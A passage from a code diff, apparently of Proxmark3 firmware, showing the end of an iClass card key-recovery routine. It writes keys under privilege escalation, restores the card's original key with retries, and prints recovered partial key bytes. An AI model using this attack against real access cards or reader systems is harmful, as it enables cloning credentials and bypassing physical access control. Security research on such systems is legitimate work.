+                DbpString("Privilege Escalation:...."_GREEN_("Ok!"));
+            }
+            if (status_message >= 4) {
+                DbpString("Wrote key: ");
+                Dbhexdump(8, genkeyblock, false);
+            }
+            if (status_message >= 5) {
+                DbpString("Key Update:.............."_GREEN_("Verified!"));
+            }
+            if (status_message >= 6) {
+                DbpString("Original Key Restore:...."_GREEN_("Ok!"));
+            }
+            if (status_message >= 7) {
+                DbpString("Original Key Restore:...."_GREEN_("Verified!"));
+            }
+        }
+
+        if (write_error && (msg->debug || msg->test)) { // if there was a write error, re-run the loop for the same key index
+            DbpString("Loop Error: "_RED_("Repeating Loop!"));
+            card_select = false;
+            card_auth = false;
+            priv_esc = false;
+        } else {
+            loops++;
+            index++;
+            status_message = 2;
+        }
+
+    }// end while
+
+fast_restore:
+    ;// empty statement for compilation
+    uint8_t mac2[4] = {0};
+    uint8_t wb[9] = {0};
+    uint8_t blockno = 3;
+    wb[0] = blockno;
+    bool reverted = false;
+    uint8_t revert_retries = 0;
+
+    while (reverted == false) {
+        // Regain privilege escalation with a readcheck
+        start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+        iclass_send_as_reader(read_check_cc, sizeof(read_check_cc), &start_time, &eof_time, shallow_mod);
+        memcpy(wb + 1, fast_restore_key, 8);
+        doMAC_N(wb, sizeof(wb), div_key2, mac2);
+
+        start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+        if (iclass_writeblock_sp(blockno, fast_restore_key, mac2, shallow_mod, &start_time, &eof_time, short_delay)) {
+            status_message = 6; // restore of original key successful but unverified
+        }
+
+        // Do a readcheck first to reset the cypher state
+        start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+        iclass_send_as_reader(read_check_cc2, sizeof(read_check_cc2), &start_time, &eof_time, shallow_mod);
+
+        // need to craft the authentication payload accordingly
+        memcpy(msg->req.key, original_mac, 8);
+
+        start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+        res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1);
+        if (res == true) {
+            status_message = 7; // restore of original key verified - card usable again
+            reverted = true;
+        }
+
+        revert_retries++;
+        if (revert_retries >= 7) { // must always be an odd number!
+            DbpString("");
+            DbpString(_CYAN_("Last Written Key (fast): "));
+            Dbhexdump(8, fast_restore_key, false);
+            Dbprintf(_RED_("Attempted to restore original key for %3d times and failed. Stopping. Card is likely unusable."), revert_retries);
+        }
+        if (recovered && reverted) {
+            goto restore;
+        } else if (revert_retries >= 7) {
+            goto out;
+        }
+    }
+    goto out;
+
+restore:
+    ;// empty statement for compilation
+    uint8_t partialkey[PICOPASS_BLOCK_SIZE] = {0};
+
+    for (int i = 0; i < PICOPASS_BLOCK_SIZE; i++) {
+        if (msg->fast) {
+            partialkey[i] = fast_restore_key[i] ^ bits_found;
+        } else {
+            partialkey[i] = genkeyblock[i] ^ bits_found;
+        }
+    }
+
+    // Print the bits decimal value
+    DbpString("");
+    DbpString(_RED_("--------------------------------------------------------"));
+    Dbprintf("Decimal Value of last 3 bits: " _GREEN_("[%3d]"), bits_found);
+    // Print the 24 bits found from k1
+    DbpString(_RED_("--------------------------------------------------------"));
+    DbpString(_RED_("SUCCESS! Raw Key Partial Bytes: "));
+    Dbhexdump(8, partialkey, false);
+    DbpString(_RED_("--------------------------------------------------------"));
+    switch_off();
+    reply_ng(CMD_HF_ICLASS_RECOVER, PM3_SUCCESS, NULL, 0);
+
+
+out:
+
+    switch_off();
+    if (completed) {
+        reply_ng(CMD_HF_ICLASS_RECOVER, PM3_EINVARG, NULL, 0);
+    } else if (interrupted) {
+        reply_ng(CMD_HF_ICLASS_RECOVER, PM3_EOPABORTED, NULL, 0);
+    } else {
+        reply_ng(CMD_HF_ICLASS_RECOVER, PM3_ESOFT, NULL, 0);
     }
 }
